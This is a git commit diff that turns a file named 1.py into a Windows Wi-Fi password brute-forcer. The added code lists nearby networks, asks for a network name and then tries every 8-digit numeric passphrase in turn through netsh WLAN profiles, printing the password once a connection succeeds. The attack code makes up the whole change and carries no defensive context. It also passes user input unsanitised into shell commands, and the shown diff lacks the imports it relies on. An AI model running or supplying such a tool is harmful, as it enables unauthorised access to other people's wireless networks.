a3461103f56be858cd4b3194c6afd8638ff96e0a
Sarobidy502 <143211638+Sarobidy502@users.noreply.github.com>
2024-05-24 09:47:08 +0300

    Update 1.py

--- 1.py
+++ 1.py
@@ -1,15 +1,64 @@
+# function to establish a new connection
+def createNewConnection(name, SSID, password):
+    config = """<?xml version=\"1.0\"?>
+            <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+                <name>"""+name+"""</name>
+                <SSIDConfig>
+                    <SSID>
+                        <name>"""+SSID+"""</name>
+                    </SSID>
+                </SSIDConfig>
+                <connectionType>ESS</connectionType>
+                <connectionMode>auto</connectionMode>
+                <MSM>
+                    <security>
+                        <authEncryption>
+                            <authentication>WPA2PSK</authentication>
+                            <encryption>AES</encryption>
+                            <useOneX>false</useOneX>
+                        </authEncryption>
+                        <sharedKey>
+                            <keyType>passPhrase</keyType>
+                            <protected>false</protected>
+                            <keyMaterial>"""+password+"""</keyMaterial>
+                        </sharedKey>
+                    </security>
+                </MSM>
+            </WLANProfile>"""
+    command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
+    with open(name+".xml", 'w') as file:
+        file.write(config)
+    os.system(command)
+ 
+# function to connect to a network   
+def connect(name, SSID):
+    command = "netsh wlan connect name=\""+name+"\" ssid=\""+SSID+"\" interface=Wi-Fi"
+    os.system(command)
+ 
+# function to display avavilabe Wifi networks   
+def displayAvailableNetworks():
+    command = "netsh wlan show networks interface=Wi-Fi"
+    os.system(command)
 
-# Fonction pour se connecter au réseau WiFi sélectionné
-def connect_to_network(selected_network):
-    password = input(f"Veuillez saisir le mot de passe pour {selected_network.ssid} : ")
+displayAvailableNetworks()
 
-    try:
-        scheme = wifi.Scheme.for_cell('wlan0', selected_network.ssid, selected_network, password)
-        scheme.save()
-        print("Connexion réussie!")
-    except wifi.exceptions.ConnectionError:
-        print("Mot de passe incorrect. Veuillez réessayer.")
+name = input("Name of Wi-Fi: ")
 
-# Scanner les réseaux WiFi et se connecter
-selected_network = scan_wifi_networks()
-connect_to_network(selected_network)
+def raid():
+    chars = '0123456789'
+
+    for length in range(8, 9): 
+        to_attempt = product(chars, repeat=length)
+        for attempt in to_attempt:
+            print(''.join(attempt))
+            createNewConnection(name, name, ''.join(attempt))
+            connect(name, name) 
+            try: 
+                if re.sub(' +', ' ', subprocess.check_output("Netsh WLAN show interfaces").decode('utf-8').split("SSID",1)[1].split("BSSID")[0].replace(':', '').replace('\n', '')) == name:
+                    print('connected to: ' + name)
+                    print('The wifi password is: ' + ''.join(attempt))
+                    break
+            except Exception:
+                print('Not connected')
+
+raid()
